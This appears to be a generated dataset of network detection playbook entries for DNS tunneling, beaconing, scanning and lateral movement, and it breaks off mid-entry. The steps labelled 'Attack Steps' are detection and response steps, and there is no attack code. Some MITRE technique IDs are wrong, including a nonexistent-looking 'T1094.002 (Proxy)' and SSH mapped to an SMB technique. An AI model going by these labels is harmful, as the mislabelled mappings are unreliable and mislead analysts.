- **Vulnerability**: DNS protocol abuse
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Covert exfiltration
- **Tools**: Wireshark, Zeek, DNS Logs
- **Scenario**: Malicious actors exfiltrate sensitive data by encoding it within DNS query packets
- **Attack Steps**: 1. Analyze PCAP focusing on DNS traffic filtering UDP port 53. 2. Extract DNS query names and measure their length and character entropy. 3. Detect queries with unusually long subdomain names (e.g., > 50 characters) or with high entropy values suggestive of encoded data. 4. Correlate frequency of DNS queries per host and check for bursts indicating data exfiltration attempts. 5. Match suspicious domains against threat intel for known DNS tunnels (e.g., dnscat2). 6. Capture and decode DNS payload to verify presence of base64 or hex encoded data. 7. Generate alerts for abnormal DNS query patterns and notify SOC. 8. Implement DNS filtering to block suspicious domains and log further attempts.
- **Detection**: DNS entropy + frequency analysis
- **Solution**: DNS filtering + domain blocking
- **Tags**: #dnstunnel #dnsexfil #networkmonitor

## Detect Port Scanning using NetFlow Traffic

- **Attack Type**: Reconnaissance
- **Target**: Network Perimeter
- **Vulnerability**: Unsolicited connection attempts
- **MITRE**: T1595.001 (Active Scanning)
- **Impact**: Discovery and footprinting
- **Tools**: NetFlow, sFlow, Zeek
- **Scenario**: Adversary scans network hosts and ports to identify potential targets
- **Attack Steps**: 1. Collect flow records and filter for connections with very short duration and no payload transfer. 2. Identify source IPs that contact multiple destination IPs and/or ports within short timeframes. 3. Use thresholds (e.g., >100 ports scanned in 5 minutes) to trigger alerts. 4. Correlate scanning activity with failed connection attempts or resets. 5. Use Zeek to map scanning techniques (SYN scan, connect scan). 6. Alert on internal or external IPs performing aggressive scans across critical segments. 7. Block scanning IPs dynamically using firewall rules or IPS. 8. Provide detailed reports on scan targets and ports for further investigation.
- **Detection**: Flow aggregation + timing analysis
- **Solution**: Dynamic blocking + IPS tuning
- **Tags**: #portscan #netflow #reconnaissance

## Identify Beaconing Behavior in Encrypted DNS over HTTPS (DoH)

- **Attack Type**: Command and Control (C2)
- **Target**: Network Perimeter
- **Vulnerability**: Encrypted covert channels
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Hidden C2 communication
- **Tools**: Zeek, PCAP, Proxy Logs
- **Scenario**: Adversary uses DoH to hide periodic beaconing communications over encrypted DNS
- **Attack Steps**: 1. Extract DNS over HTTPS flows from PCAP or network logs using port 443 with DNS query characteristics. 2. Analyze timing patterns of encrypted DNS queries to external DoH servers. 3. Detect high-frequency, regular interval connections that do not match user browsing behavior. 4. Correlate with client IP and hostname to identify compromised hosts. 5. Use TLS fingerprinting to profile uncommon DoH clients or tools. 6. Alert on anomalous DoH usage with strong periodicity. 7. Block or quarantine hosts using network segmentation. 8. Recommend disabling DoH on managed endpoints or enforcing DNS inspection proxies.
- **Detection**: Flow timing + TLS fingerprinting
- **Solution**: Endpoint control + proxy inspection
- **Tags**: #DoH #dnsbeacon #encryptedc2

## Detect Suspicious SMB Named Pipe Traffic

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: SMB RPC abuse
- **MITRE**: T1021.002 (SMB/Windows Admin Shares)
- **Impact**: Remote code execution
- **Tools**: Wireshark, Zeek, SMB Logs
- **Scenario**: Adversary uses SMB named pipes to execute remote commands or move laterally
- **Attack Steps**: 1. Filter PCAP for SMB traffic accessing named pipes (e.g., \\pipe\\svcctl). 2. Identify packets initiating remote procedure calls (RPC) over SMB. 3. Detect unauthorized accesses to critical named pipes used by system services. 4. Correlate source and destination IPs with known asset inventories. 5. Alert on new or unusual named pipe access from unexpected hosts or users. 6. Log authentication attempts and failures linked to named pipe usage. 7. Block or quarantine hosts abusing SMB named pipes. 8. Enhance endpoint monitoring for RPC abuse.
- **Detection**: Named pipe access + auth logs
- **Solution**: Endpoint controls + firewall rules
- **Tags**: #namedpipe #smbabuse #lateralmovement

## Detect DNS Exfiltration via TXT Record Queries

- **Attack Type**: Data Exfiltration
- **Target**: Network DNS
- **Vulnerability**: Protocol misuse
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Covert data exfiltration
- **Tools**: Wireshark, Zeek, DNS Logs
- **Scenario**: Malicious use of DNS TXT queries to exfiltrate encoded data from internal hosts
- **Attack Steps**: 1. Extract all DNS TXT record queries from PCAP or DNS logs. 2. Analyze payload content for high entropy or long strings typical of encoded data. 3. Identify high volume or repeated TXT queries from same hosts. 4. Correlate suspicious TXT domains with threat intelligence feeds. 5. Alert on unusual spikes of TXT queries outside normal business hours. 6. Decode sample TXT responses to confirm presence of data exfiltration. 7. Implement network policies to restrict TXT record queries to trusted DNS servers. 8. Notify incident response teams for further host inspection.
- **Detection**: Query pattern + entropy analysis
- **Solution**: DNS filtering + host investigation
- **Tags**: #dnstxt #dataexfil #networksecurity

## Identify Lateral Movement Using RDP over Non-Standard Ports

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: Network protocol abuse
- **MITRE**: T1021.001 (Remote Services)
- **Impact**: Lateral access, evasion
- **Tools**: NetFlow, Wireshark, IDS
- **Scenario**: Attacker moves laterally by connecting to remote hosts using RDP over uncommon ports to evade detection
- **Attack Steps**: 1. Analyze flow data to detect RDP protocol signatures (TLS handshake, port 3389 pattern) on ports other than default 3389. 2. Flag connections using RDP over high, uncommon ports (e.g., 50000+). 3. Correlate source IPs initiating RDP connections with user login events. 4. Identify connections with short session times or failed login attempts followed by success. 5. Alert on lateral connections bypassing default network controls. 6. Block non-standard port RDP traffic on firewalls and monitor user behavior. 7. Notify SOC for credential review and host inspection. 8. Enforce network segmentation and multi-factor authentication for RDP access.
- **Detection**: Flow analysis + login events
- **Solution**: Firewall rules + MFA
- **Tags**: #rdp #lateralmovement #nonstandardport

## Detect HTTP Tunnel Usage via PCAP Analysis

- **Attack Type**: Covert Channel
- **Target**: Network Perimeter
- **Vulnerability**: Protocol tunneling
- **MITRE**: T1071.001 (Application Layer Protocol)
- **Impact**: Data exfiltration
- **Tools**: Wireshark, Zeek, Proxy Logs
- **Scenario**: Adversary uses HTTP/HTTPS tunneling to bypass firewalls and exfiltrate data
- **Attack Steps**: 1. Identify unusually long or frequent HTTP POST requests with opaque payloads. 2. Use Zeek to detect HTTP requests with non-browser User-Agent strings or missing standard headers. 3. Analyze packet timing and size to spot beacon-like behavior within HTTP streams. 4. Extract payload and analyze for encapsulated protocols or encrypted content. 5. Correlate source IP with suspicious outbound connections. 6. Alert and block suspicious HTTP sessions at perimeter proxy. 7. Educate users about suspicious tunneling techniques. 8. Deploy DPI (Deep Packet Inspection) tools to detect and block unauthorized tunnels.
- **Detection**: HTTP header + payload analysis
- **Solution**: DPI + proxy filtering
- **Tags**: #httptunnel #pcapanalysis #exfiltration

## Spot Beaconing Activity Using Flow Analysis

- **Attack Type**: Command and Control (C2)
- **Target**: Network Perimeter
- **Vulnerability**: Periodic communication
- **MITRE**: T1071.001 (Application Layer Protocol)
- **Impact**: Persistent C2 channel
- **Tools**: NetFlow, sFlow, Zeek
- **Scenario**: Detect hosts beaconing to external servers based on periodic netflow patterns
- **Attack Steps**: 1. Aggregate flow records to identify hosts with outbound connections occurring at fixed intervals. 2. Use statistical analysis (Fourier transform or autocorrelation) to detect periodic flows. 3. Flag hosts contacting same external IP on consistent time intervals. 4. Cross-reference external IPs with threat intel to identify malicious infrastructure. 5. Alert on high beacon frequency or data volume anomalies. 6. Block IPs or quarantine hosts for investigation. 7. Review host processes for C2 tools. 8. Fine-tune IDS/IPS with beaconing signatures.
- **Detection**: Periodicity + IP reputation
- **Solution**: Quarantine + block IP
- **Tags**: #beaconing #flowanalysis #c2

## Detect DNS TXT Record Data Exfiltration

- **Attack Type**: Data Exfiltration
- **Target**: Network DNS
- **Vulnerability**: DNS protocol misuse
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Data theft and covert exfiltration
- **Tools**: Wireshark, Zeek, DNS Logs
- **Scenario**: Adversary exfiltrates data encoded in DNS TXT record queries
- **Attack Steps**: 1. Analyze DNS traffic focusing on TXT queries and responses, extract query lengths and content entropy. 2. Flag unusually long TXT records or those with high entropy values indicating encoded data. 3. Monitor frequency of TXT queries per host for abnormal spikes outside business hours. 4. Correlate suspicious domains against known malicious indicators in threat intel databases. 5. Decode sample encoded TXT responses to confirm exfiltration payloads. 6. Alert SOC and quarantine affected hosts. 7. Restrict DNS TXT record queries through firewall or DNS server policies. 8. Review DNS resolver logs for persistent suspicious activity to identify attack campaigns.
- **Detection**: Entropy analysis + query frequency
- **Solution**: DNS filtering + host isolation
- **Tags**: #dnstxt #dataexfil #dnsmonitoring

## Identify DNS Tunnel Using Subdomain Entropy

- **Attack Type**: Covert Channel
- **Target**: Network DNS
- **Vulnerability**: DNS tunneling
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Covert communication and data theft
- **Tools**: Wireshark, Zeek, SIEM
- **Scenario**: Attackers tunnel data inside DNS queries with random-looking subdomains
- **Attack Steps**: 1. Capture DNS query logs and extract subdomain parts of each query. 2. Calculate Shannon entropy for each subdomain segment to detect randomness. 3. Flag queries with subdomains having entropy above a threshold (e.g., > 4.0). 4. Aggregate frequency of flagged queries per host and per domain. 5. Cross-reference suspicious domains with known DNS tunnel providers. 6. Alert security team and block communication with flagged domains. 7. Implement DNS request rate limiting and filtering on recursive resolvers. 8. Educate users on risks of using unauthorized DNS services.
- **Detection**: Entropy + frequency analysis
- **Solution**: Recursive resolver policies
- **Tags**: #dnstunnel #entropy #networksecurity

## Spot DNS Beaconing Patterns to Malicious Domains

- **Attack Type**: Command and Control (C2)
- **Target**: Network DNS
- **Vulnerability**: DNS protocol abuse
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Persistent C2 communication
- **Tools**: Wireshark, Zeek, Threat Intel
- **Scenario**: Persistent beaconing by infected hosts to attacker-controlled DNS servers
- **Attack Steps**: 1. Extract DNS query logs and identify repeated queries to the same domain at regular intervals. 2. Use time-series analysis to detect periodicity in query frequency. 3. Check for DNS queries with randomized subdomains or fast-flux style domains. 4. Match domain names with threat intel blacklists and IOC databases. 5. Alert SOC when hosts beacon consistently over extended periods. 6. Correlate with other network events (HTTP requests, SMB traffic) for multistage attack detection. 7. Block DNS queries to malicious domains using DNS filtering services. 8. Initiate incident response and host isolation where necessary.
- **Detection**: Time-series periodicity + intel
- **Solution**: DNS blocklists + host quarantine
- **Tags**: #dnsbeacon #c2 #networkdefense

## Detect Use of DNS over HTTPS (DoH) for Tunneling

- **Attack Type**: Protocol Tunneling
- **Target**: Network Perimeter
- **Vulnerability**: Encrypted tunneling
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Covert data tunneling
- **Tools**: Zeek, PCAP, Proxy Logs
- **Scenario**: Adversary uses encrypted DNS over HTTPS to bypass inspection and tunnel data
- **Attack Steps**: 1. Analyze HTTPS traffic for connections to known DoH servers (e.g., Cloudflare, Google). 2. Use TLS fingerprinting to identify non-browser clients communicating with DoH endpoints. 3. Detect hosts with frequent, periodic HTTPS requests to DoH services outside normal browsing patterns. 4. Alert when large volumes of DNS queries are encapsulated in encrypted HTTPS traffic. 5. Block or proxy DoH traffic in enterprise networks to inspect DNS requests. 6. Notify SOC of suspicious DoH client behavior. 7. Enforce endpoint policies disabling DoH or mandating enterprise DNS resolution. 8. Continuously update detection rules based on new DoH tunneling techniques.
- **Detection**: TLS fingerprinting + traffic patterns
- **Solution**: Endpoint policy + network proxy
- **Tags**: #DoH #dnsproxy #encrypteddns

## Identify Abnormal Increase in NXDOMAIN Responses

- **Attack Type**: Reconnaissance
- **Target**: Network DNS
- **Vulnerability**: DNS misuse
- **MITRE**: T1595.001 (Active Scanning)
- **Impact**: Network reconnaissance
- **Tools**: Wireshark, Zeek, SIEM
- **Scenario**: Attackers generate many DNS queries for non-existent domains to map network or evade detection
- **Attack Steps**: 1. Analyze DNS logs for high volume of NXDOMAIN (non-existent domain) responses. 2. Identify hosts responsible for large numbers of failed DNS queries. 3. Detect bursts of NXDOMAIN queries clustered in short time intervals. 4. Alert if NXDOMAIN queries target random or algorithmically generated domain names (DGA). 5. Cross-reference with known DGA domains and threat intelligence. 6. Block traffic or throttle DNS queries from suspicious hosts. 7. Correlate with other attack vectors (e.g., malware execution). 8. Investigate host and user activity for potential compromise.
- **Detection**: NXDOMAIN frequency + DGA detection
- **Solution**: Query throttling + host investigation
- **Tags**: #dnsrecon #nxdomain #threatintel

## Detect Data Exfiltration via DNS A Record Queries

- **Attack Type**: Data Exfiltration
- **Target**: Network DNS
- **Vulnerability**: Protocol abuse
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Covert data exfiltration
- **Tools**: Wireshark, Zeek, DNS Logs
- **Scenario**: Attackers encode stolen data into DNS A record queries sent to attacker-controlled DNS servers
- **Attack Steps**: 1. Filter PCAP/DNS logs for A record queries to suspicious domains. 2. Extract subdomain portions and analyze for irregular length or character distributions. 3. Use entropy calculations to detect encoded data. 4. Identify bursty query patterns inconsistent with normal user behavior. 5. Cross-check suspicious domains with threat intelligence feeds. 6. Alert SOC and isolate hosts generating suspicious DNS queries. 7. Block malicious DNS domains at network or resolver level. 8. Conduct forensic analysis on endpoints to confirm data compromise.
- **Detection**: Query pattern + entropy analysis
- **Solution**: DNS domain blocking + endpoint forensics
- **Tags**: #dnsarecord #dataexfil #securityops

## Identify Use of DNS TXT Queries for C2 Communication

- **Attack Type**: Command and Control (C2)
- **Target**: Network DNS
- **Vulnerability**: DNS protocol abuse
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Persistent C2 communication
- **Tools**: Wireshark, Zeek, Threat Intel
- **Scenario**: Attackers use DNS TXT queries to maintain C2 channels with compromised hosts
- **Attack Steps**: 1. Monitor DNS TXT queries and responses for hosts connecting to suspicious or known malicious domains. 2. Detect periodic queries or irregularly formatted TXT payloads. 3. Use entropy measures and pattern matching to detect encoded commands or data. 4. Cross-reference DNS domains against threat intel for known C2 infrastructure. 5. Alert on increased volume or frequency of DNS TXT requests. 6. Block domains at DNS firewall and isolate affected hosts. 7. Engage incident response for host containment and investigation. 8. Harden DNS resolver configurations to restrict TXT queries.
- **Detection**: Payload inspection + frequency
- **Solution**: DNS filtering + host quarantine
- **Tags**: #dnstxt #dnsC2 #networkmonitoring

## Detect Fast Flux DNS Patterns Indicative of Botnets

- **Attack Type**: Botnet Command & Control
- **Target**: Network DNS
- **Vulnerability**: DNS infrastructure
- **MITRE**: T1094.002 (Proxy)
- **Impact**: Botnet C2 evasion
- **Tools**: Wireshark, Zeek, DNS Logs
- **Scenario**: Attackers use fast flux DNS techniques to evade detection and control botnets
- **Attack Steps**: 1. Analyze DNS query responses for rapidly changing A records associated with single domain names. 2. Track TTL (time-to-live) values for suspiciously low durations. 3. Identify domains resolving to large sets of IP addresses across short time windows. 4. Correlate domains with known fast flux botnet indicators in threat feeds. 5. Alert SOC of domains exhibiting fast flux patterns. 6. Block or sinkhole suspicious domains at DNS infrastructure. 7. Monitor host connections to fast flux IP ranges. 8. Initiate network-wide botnet mitigation procedures.
- **Detection**: DNS record volatility + IP diversity
- **Solution**: DNS sinkholing + IP blacklists
- **Tags**: #fastflux #botnet #dnsmalware

## Spot Abnormal Use of DNS TXT for Tunnel Keep-Alives

- **Attack Type**: Protocol Tunneling
- **Target**: Network DNS
- **Vulnerability**: DNS tunneling
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Covert channel persistence
- **Tools**: Wireshark, Zeek, DNS Logs
- **Scenario**: Attackers send frequent DNS TXT queries as keep-alive signals in tunnels
- **Attack Steps**: 1. Filter DNS TXT queries and analyze timing intervals between requests from hosts. 2. Detect highly periodic, small-sized TXT queries consistent with keep-alives. 3. Cross-reference with expected normal DNS traffic patterns. 4. Alert on hosts showing excessive or anomalous TXT keep-alive behavior. 5. Analyze payload contents for encoding or encrypted strings. 6. Block domains associated with such behavior or isolate hosts. 7. Review DNS resolver logs for persistent tunneling attempts. 8. Educate network users and administrators on DNS tunneling threats.
- **Detection**: Timing analysis + payload entropy
- **Solution**: DNS firewall + user education
- **Tags**: #dnstxt #tunneling #keepalive

## Detect DNS Request Floods for Denial of Service

- **Attack Type**: Denial of Service
- **Target**: Network DNS
- **Vulnerability**: Protocol abuse
- **MITRE**: T1499 (Endpoint Denial of Service)
- **Impact**: Service disruption
- **Tools**: Wireshark, Zeek, Network Monitoring
- **Scenario**: Attackers generate large volumes of DNS queries to overwhelm DNS servers
- **Attack Steps**: 1. Analyze DNS traffic volume and query rate metrics from PCAP or network logs. 2. Identify hosts sending excessive DNS queries in bursts. 3. Detect query types and lengths commonly used in amplification attacks (e.g., ANY requests). 4. Alert on sudden spikes in DNS requests indicative of DoS activity. 5. Correlate with upstream DNS resolver performance and error rates. 6. Implement rate limiting on DNS requests per host or subnet. 7. Blacklist abusive IPs or networks generating floods. 8. Collaborate with ISP for upstream filtering if required.
- **Detection**: Query rate + volume analysis
- **Solution**: Rate limiting + IP blocking
- **Tags**: #dnsdos #dnsflood #networkdefense

## Detect Internal Port Scanning via NetFlow

- **Attack Type**: Reconnaissance
- **Target**: Internal Network
- **Vulnerability**: Unsolicited connections
- **MITRE**: T1595.001 (Active Scanning)
- **Impact**: Discovery of network assets
- **Tools**: NetFlow, sFlow, SIEM
- **Scenario**: Adversary scans internal network hosts to find vulnerable services
- **Attack Steps**: 1. Collect flow records and filter for short-duration connections with no data transfer. 2. Identify source IPs contacting multiple destination IPs and many destination ports within a short timeframe (e.g., scanning 100+ ports in 10 minutes). 3. Correlate with asset inventory to detect scans against critical assets. 4. Alert on port scanning activity originating from internal hosts. 5. Block or quarantine scanning hosts and restrict lateral communication. 6. Notify SOC to investigate possible compromised machines. 7. Implement network segmentation to limit lateral spread. 8. Tune IDS/IPS to detect scanning behavior in real-time.
- **Detection**: Flow aggregation + timing analysis
- **Solution**: Network segmentation + host isolation
- **Tags**: #internalscan #netflow #recon

## Identify Beaconing to External IPs via Flow

- **Attack Type**: Command and Control (C2)
- **Target**: Endpoint Network
- **Vulnerability**: Periodic communication
- **MITRE**: T1071.001 (Application Layer Protocol)
- **Impact**: Persistent C2 channel
- **Tools**: NetFlow, sFlow, Zeek
- **Scenario**: Host beaconing periodically to attacker-controlled IP addresses
- **Attack Steps**: 1. Aggregate flow data to find hosts with repeated outbound connections to same external IP at regular intervals. 2. Use autocorrelation or spectral analysis to detect periodicity in flow timestamps. 3. Flag hosts showing high beacon frequency (>1 per minute for extended duration). 4. Cross-reference IP addresses with threat intel for known malicious infrastructure. 5. Alert SOC and initiate host isolation if confirmed. 6. Investigate endpoint for malicious processes. 7. Update detection rules based on observed beaconing characteristics. 8. Block malicious IPs at perimeter firewall.
- **Detection**: Periodicity detection + intel
- **Solution**: Endpoint isolation + firewall block
- **Tags**: #beaconing #netflow #c2

## Detect Lateral Movement via Remote Desktop Flow

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: Unauthorized access
- **MITRE**: T1021.001 (Remote Services)
- **Impact**: Lateral movement and privilege escalation
- **Tools**: NetFlow, SIEM, Zeek
- **Scenario**: Adversary moves laterally by establishing RDP sessions with internal hosts
- **Attack Steps**: 1. Filter flow data for TCP sessions on port 3389 (RDP). 2. Identify source hosts initiating multiple RDP sessions to internal IPs. 3. Detect unusual connection times or volumes from hosts not typically using RDP. 4. Correlate with user login events on target hosts to identify suspicious activity. 5. Alert SOC if RDP connections come from unauthorized users or at unusual times. 6. Block or quarantine suspicious hosts. 7. Enforce MFA and limit RDP access. 8. Audit RDP logs and user activities post-alert.
- **Detection**: Flow filtering + user correlation
- **Solution**: Access control + MFA enforcement
- **Tags**: #rdp #lateralmovement #netflow

## Identify DNS Tunneling via Flow Volume Analysis

- **Attack Type**: Data Exfiltration
- **Target**: Network DNS
- **Vulnerability**: DNS tunneling
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)
- **Impact**: Data exfiltration
- **Tools**: NetFlow, Zeek, DNS Logs
- **Scenario**: Malicious DNS tunneling causing unusual volume spikes in DNS flows
- **Attack Steps**: 1. Aggregate flow data focusing on UDP port 53 (DNS). 2. Detect unusually high volumes of DNS traffic from specific hosts. 3. Analyze patterns for bursts or periodic spikes associated with data exfiltration. 4. Correlate suspicious flows with DNS query logs for tunneling indicators. 5. Alert SOC on anomalous DNS traffic volume and frequency. 6. Block hosts or domains responsible for suspicious DNS tunneling. 7. Enforce DNS filtering and inspection. 8. Conduct endpoint forensics on suspected compromised hosts.
- **Detection**: Volume + pattern detection
- **Solution**: DNS filtering + host isolation
- **Tags**: #dnstunnel #netflow #exfiltration

## Detect Port Sweeps via Flow Logs

- **Attack Type**: Reconnaissance
- **Target**: Internal Network
- **Vulnerability**: Unauthorized scans
- **MITRE**: T1595.001 (Active Scanning)
- **Impact**: Network reconnaissance
- **Tools**: NetFlow, SIEM, Zeek
- **Scenario**: Adversary performs a quick sweep of multiple ports on single or multiple hosts
- **Attack Steps**: 1. Analyze flow records for short-lived connections from a single source IP to multiple destination ports. 2. Identify port sweeps where connections are attempted in rapid succession. 3. Flag if sweep targets high-value assets or critical infrastructure. 4. Alert SOC with detailed sweep source and target IPs. 5. Block scanning IPs or segment the network to restrict access. 6. Correlate with firewall logs and endpoint alerts. 7. Enhance network visibility with flow data enrichment. 8. Tune IDS to detect sweep patterns in real time.
- **Detection**: Flow timing + connection count
- **Solution**: Firewall blocking + network segmentation
- **Tags**: #portsweep #netflow #detection

## Identify Suspicious UDP Beaconing Traffic

- **Attack Type**: Command and Control (C2)
- **Target**: Endpoint Network
- **Vulnerability**: Periodic communication
- **MITRE**: T1071.001 (Application Layer Protocol)
- **Impact**: Persistent C2 communication
- **Tools**: NetFlow, SIEM, Zeek
- **Scenario**: Malicious UDP beaconing traffic signaling compromised hosts
- **Attack Steps**: 1. Collect flow data focusing on UDP traffic to external IPs. 2. Detect hosts sending small, periodic UDP packets at regular intervals. 3. Use statistical models to identify anomalous periodicity compared to baseline. 4. Cross-reference destination IPs with threat intel sources. 5. Alert on suspicious UDP beaconing behavior. 6. Quarantine affected hosts and block IPs. 7. Investigate endpoint for malware indicators. 8. Update detection signatures based on new beaconing patterns.
- **Detection**: Periodicity detection + intel
- **Solution**: Endpoint isolation + firewall block
- **Tags**: #udpbeacon #netflow #c2

## Detect Suspicious Lateral SMB Traffic via Flow

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: SMB abuse
- **MITRE**: T1021.002 (SMB/Windows Admin Shares)
- **Impact**: Lateral movement and data theft
- **Tools**: NetFlow, SIEM, Zeek
- **Scenario**: Attackers use SMB flows to move laterally inside the network
- **Attack Steps**: 1. Filter flow records for TCP port 445 (SMB). 2. Identify internal hosts initiating many SMB connections to multiple destinations. 3. Detect anomalous SMB flow volume or frequency compared to baseline. 4. Correlate with endpoint logs for process or user anomalies. 5. Alert SOC on lateral SMB activity inconsistent with normal behavior. 6. Restrict SMB traffic and enforce strict access controls. 7. Monitor endpoints for credential theft or misuse. 8. Conduct forensic analysis on affected hosts.
- **Detection**: Flow volume + frequency analysis
- **Solution**: Access controls + endpoint monitoring
- **Tags**: #smbtraffic #lateralmovement #netflow

## Spot Abnormal Use of High Port Connections

- **Attack Type**: Evasion
- **Target**: Endpoint Network
- **Vulnerability**: Protocol misuse
- **MITRE**: T1071.001 (Application Layer Protocol)
- **Impact**: Evasion and covert communication
- **Tools**: NetFlow, SIEM, Firewall
- **Scenario**: Adversary uses high-numbered ports to evade detection
- **Attack Steps**: 1. Analyze flow logs for connections on ports > 49152 (dynamic/private range). 2. Identify hosts with sudden spikes in high port usage for outbound connections. 3. Flag uncommon protocols or unexpected services on these ports. 4. Correlate with endpoint alerts and user activity logs. 5. Alert on anomalies possibly related to covert tunnels or malware communication. 6. Block or monitor unusual high port traffic at network perimeter. 7. Investigate endpoints for unauthorized software or scripts. 8. Enforce network policies restricting high port use.
- **Detection**: Port usage analysis + correlation
- **Solution**: Network policy + endpoint investigation
- **Tags**: #highports #evasion #netsecurity

## Detect Use of Proxy or VPN via Flow Characteristics

- **Attack Type**: Evasion
- **Target**: Endpoint Network
- **Vulnerability**: Traffic obfuscation
- **MITRE**: T1027 (Obfuscated Files or Information)
- **Impact**: Detection evasion
- **Tools**: NetFlow, SIEM, Threat Intel
- **Scenario**: Attackers use proxy or VPN services to mask traffic and evade detection
- **Attack Steps**: 1. Analyze flow metadata for traffic to known proxy or VPN IP ranges. 2. Identify hosts generating encrypted flows with atypical session durations or packet sizes. 3. Use threat intel feeds to mark suspicious VPN endpoints. 4. Alert on unusual traffic volume or persistent sessions through proxies. 5. Enforce blocking or monitoring of unauthorized proxy or VPN usage. 6. Notify SOC for host investigation. 7. Implement endpoint restrictions and network access control. 8. Use DPI and behavior analytics for deeper inspection.
- **Detection**: IP reputation + flow behavior
- **Solution**: Access control + DPI
- **Tags**: #proxy #vpn #trafficanalysis

## Detect Abnormal Volume of ICMP Traffic via Flow

- **Attack Type**: Reconnaissance
- **Target**: Network Perimeter
- **Vulnerability**: Protocol misuse
- **MITRE**: T1595.001 (Active Scanning)
- **Impact**: Network reconnaissance
- **Tools**: NetFlow, SIEM, IDS
- **Scenario**: Adversary uses ICMP for network scanning or data tunneling
- **Attack Steps**: 1. Filter flow data for ICMP traffic types (echo request/reply). 2. Identify hosts generating unusually high volumes of ICMP packets. 3. Detect scanning behavior or tunneling attempts using ICMP payloads. 4. Alert on ICMP traffic spikes exceeding normal baseline. 5. Correlate with IDS alerts for ICMP anomalies. 6. Block or rate-limit ICMP traffic from suspicious hosts. 7. Conduct endpoint investigations for compromised machines. 8. Tune detection systems for more granular ICMP monitoring.
- **Detection**: Traffic volume + anomaly detection
- **Solution**: Rate limiting + host quarantine
- **Tags**: #icmp #recon #netflowanalysis

## Detect Anomalous Outbound SSH Connections

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: Unauthorized access
- **MITRE**: T1021.002 (Remote Services: SMB/Windows Admin Shares)
- **Impact**: Data theft, lateral movement
- **Tools**: NetFlow, SIEM, Zeek
- **Scenario**: Attackers establish SSH sessions to move laterally or exfiltrate data
- **Attack Steps**: 1. Analyze flow logs for outbound TCP connections on port 22 from internal hosts. 2. Identify hosts with unusual SSH connection patterns or to external IPs. 3. Cross-reference with user activity logs for unauthorized sessions. 4. Alert on SSH sessions at unusual hours or high frequency. 5. Block suspicious IPs and isolate compromised hosts. 6. Investigate endpoints for malware or unauthorized access. 7. Implement strict SSH access controls and logging. 8. Use MFA for SSH authentication to prevent compromise.
- **Detection**: Flow pattern + user correlation
- **Solution**: Access control + endpoint monitoring
- **Tags**: #ssh #lateralmovement #netflow

## Identify Anomalous FTP Data Transfers

- **Attack Type**: Data Exfiltration
- **Target**: Internal Network
- **Vulnerability**: Protocol misuse
- **MITRE**: T1041 (Exfiltration Over C2 Channel)
- **Impact**: Data leakage, exposure
- **Tools**: NetFlow, SIEM, Zeek
- **Scenario**: Attackers use FTP to move or exfiltrate data unnoticed
- **Attack Steps**: 1. Monitor flow data for FTP control (port 21) and data (ports 20, high ports) connections. 2. Detect large or repeated data transfers from internal hosts to external IPs. 3. Flag FTP sessions outside business hours or unusual destinations. 4. Correlate with endpoint file access logs. 5. Alert SOC and block suspicious FTP traffic. 6. Investigate hosts for malware or insider threat. 7. Disable unneeded FTP services or restrict to approved destinations. 8. Educate users on risks of unmonitored file transfers.
- **Detection**: Flow volume + timing analysis
- **Solution**: Service restriction + user training
- **Tags**: #ftp #dataexfil #netflow

## Detect Abnormal HTTPS Traffic Volume

- **Attack Type**: Evasion
- **Target**: Endpoint Network
- **Vulnerability**: Encrypted communication
- **MITRE**: T1071.001 (Application Layer Protocol)
- **Impact**: Evasion and covert communication
- **Tools**: NetFlow, SIEM, DPI
- **Scenario**: Attackers use encrypted HTTPS traffic to hide malicious communications
- **Attack Steps**: 1. Analyze flow data for HTTPS (port 443) traffic volumes per host. 2. Identify hosts with sudden spikes or persistent high volume HTTPS flows. 3. Correlate with endpoint application logs for authorized usage. 4. Use DPI to detect unusual HTTPS payload patterns or unknown SNI values. 5. Alert on anomalies for further investigation. 6. Block or monitor suspect hosts. 7. Enforce SSL inspection and endpoint controls. 8. Update threat intel with new malicious HTTPS endpoints.
- **Detection**: Flow volume + DPI analysis
- **Solution**: SSL inspection + endpoint monitoring
- **Tags**: #https #encryptedtraffic #netflow

## Spot Suspicious Use of Telnet in Network Flow

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: Unauthorized access
- **MITRE**: T1021.001 (Remote Services)
- **Impact**: Lateral movement and credential theft
- **Tools**: NetFlow, SIEM, Zeek
- **Scenario**: Attackers use Telnet protocol to move laterally inside the network
- **Attack Steps**: 1. Filter flow records for Telnet (port 23) sessions. 2. Identify source hosts initiating Telnet connections to multiple targets. 3. Detect unusual Telnet usage patterns or unexpected sessions from non-admin hosts. 4. Alert on potential unauthorized access attempts. 5. Block Telnet traffic and encourage use of secure protocols. 6. Investigate endpoints for compromised credentials. 7. Implement network segmentation and access controls. 8. Educate users on protocol security best practices.
- **Detection**: Flow filtering + user behavior analysis
- **Solution**: Access control + network hardening
- **Tags**: #telnet #lateralmovement #netflow

## Detect Anomalous SMTP Flow Patterns

- **Attack Type**: Data Exfiltration
- **Target**: Internal Network
- **Vulnerability**: Email abuse
- **MITRE**: T1041 (Exfiltration Over C2 Channel)
- **Impact**: Data leakage, spam campaigns
- **Tools**: NetFlow, SIEM, Mail Logs
- **Scenario**: Attackers use SMTP to exfiltrate data or send phishing/spam emails
